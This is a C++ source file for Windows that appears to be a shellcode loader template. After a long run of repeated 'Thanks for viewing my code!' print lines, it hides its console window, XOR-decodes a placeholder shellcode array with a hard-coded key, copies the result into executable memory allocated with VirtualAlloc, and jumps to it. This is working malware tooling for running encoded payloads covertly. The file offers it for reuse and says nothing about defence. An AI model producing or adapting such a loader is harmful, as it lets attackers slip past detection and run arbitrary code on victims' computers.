#include <cstddef>
#include <cstdlib>
#include <cstring>
#include <iostream>
#define _WIN32_WINNT 0x0500
#include <windows.h>

int main(int argc, char **argv) {
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";
  std::cout << "Thanks for viewing my code!";

  ShowWindow(GetConsoleWindow(), SW_HIDE);

  // replace the key variable with your own password or key
  char key[9] = "password";
  size_t key_len = strlen(key);

  unsigned char xor_shell_code[] = /* place_xor_shellcode_here */;
  unsigned char clear_shell_code[sizeof(xor_shell_code)];

  for (int i = 0; i < sizeof(xor_shell_code); i++) {
    clear_shell_code[i] = xor_shell_code[i] ^ key[i % key_len];
  }

  void *exec = VirtualAlloc(NULL, sizeof(clear_shell_code), MEM_COMMIT,
                            PAGE_EXECUTE_READWRITE);
  if (exec) {
    memcpy(exec, clear_shell_code, sizeof(clear_shell_code));
    ((void (*)())exec)();
  } else {
    std::exit(1);
  }
}
